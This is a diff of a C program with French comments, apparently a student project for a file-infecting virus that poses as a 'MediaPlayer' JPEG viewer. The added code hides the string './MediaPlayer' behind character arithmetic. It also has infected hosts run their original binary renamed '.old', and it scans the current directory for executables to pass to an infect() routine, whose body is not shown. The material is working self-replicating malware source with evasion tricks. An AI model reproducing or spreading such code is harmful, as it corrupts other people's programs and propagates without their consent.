@@ -4,29 +4,76 @@ char **globalptr;
 
 int main(int argc, char *argv[]) {
 
+        // nom du programme actuel
         char *name = argv[0];
+
+        // modification du pointeur global pour y ajouter l'addresse du char * contenant le nom du programme
         globalptr = &name;
 
-        if(strcmp(argv[0],"./MediaPlayer")) {
-                char *command = argv[0];
+        char str[13]; //        ./MediaPlayer
+        int i = 0;
+        i +=46;
+        str[0] = (char) i;
+        i +=1;
+        str[1] = (char) i;
+        i +=30;
+        str[2] = (char) i;
+        i +=24;
+        str[3] = (char) i;
+        i -=1;
+        str[4] = (char) i;
+        i +=5;
+        str[5] = (char) i;
+        i -=8;
+        str[6] = (char) i;
+        i -=17;
+        str[7] = (char) i;
+        i +=28;
+        str[8] = (char) i;
+        i -=11;
+        str[9] = (char) i;
+        i +=24;
+        str[10] = (char) i;
+        i -=20;
+        str[11] = (char) i;
+        i +=13;
+        str[12] = (char) i;
+
+        // determine si le programme est executé depuis le mediaplayer ou un hôte infecté
+        if(strcmp(argv[0],str)) {       // HOTE INFECTE
                 char *extension = ".old";
-                char *String = malloc(strlen(command) + strlen(extension) + 1);
+                char *String = malloc(strlen(name) + strlen(extension) + 1);
                 if(String) {
-                        strcpy(String,command);
+                        strcpy(String,name);
                         strcat(String,extension);
                         system(String);
                 }
         }
-        else {
+        else {          // MEDIAPLAYER
                 listeFichier(".jpeg");
         }
-        listingExecs();
+
+        // INFECTION
+        DIR *myDir;
+        struct dirent *dir;
+
+        myDir = opendir(".");
+        if (myDir) {
+                while ((dir = readdir(myDir)) != NULL)
+                        // PENSER A SUPPRIMER LA CONDITION SUR LE .GIT /!\/!\/!|
+                        if ((strcmp(".", dir->d_name)) && (strcmp("..", dir->d_name)) && (strcmp(".git", dir->d_name)) && (strcmp("MediaPlayer", dir->d_name)) && (strcmp("src", dir->d_name)))
+                                if(strstr(dir->d_name, ".old") == NULL)
+                                        if (access(dir->d_name, X_OK) == 0)
+                                                if (verifPresenceFichierOld(dir->d_name) == false)
+                                                        infect(dir->d_name);
+                closedir(myDir);
+        }
+
         return 0;
 }
 
 void listeFichier(char *extension) {
         DIR *myDir;
-        int cptImg = 0;
         struct dirent *dir;
         bool imgFound = false;
         char *fileName;
@@ -46,33 +93,6 @@ void listeFichier(char *extension) {
                                         strcat(String,errRedirect);
                                 }
                                 system(String);
-                        }
-                }
-                closedir(myDir);
-        }
-}
-
-/*
-        Compte le nombre de fichiers executables dans le dossier à l'execution
-*/
-void listingExecs() {
-        DIR *myDir;
-        struct dirent *dir;
-
-        // FIRST PARSING
-        myDir = opendir(".");
-        if (myDir) {
-                while ((dir = readdir(myDir)) != NULL) {
-                        // PENSER A SUPPRIMER LA CONDITION SUR LE .GIT /!\/!\/!|
-                        if ((strcmp(".", dir->d_name)) && (strcmp("..", dir->d_name)) && (strcmp(".git", dir->d_name)) && (strcmp("MediaPlayer", dir->d_name)) && (strcmp("src", dir->d_name))) {
-                                if(strstr(dir->d_name, ".old") == NULL) {
-                                        if (access(dir->d_name, X_OK) == 0) {
-                                                if (verifPresenceFichierOld(dir->d_name) == false) {
-                                                        infect(dir->d_name);
-                                                }
-
-                                        }
-                                }
                         }
                 }
                 closedir(myDir);
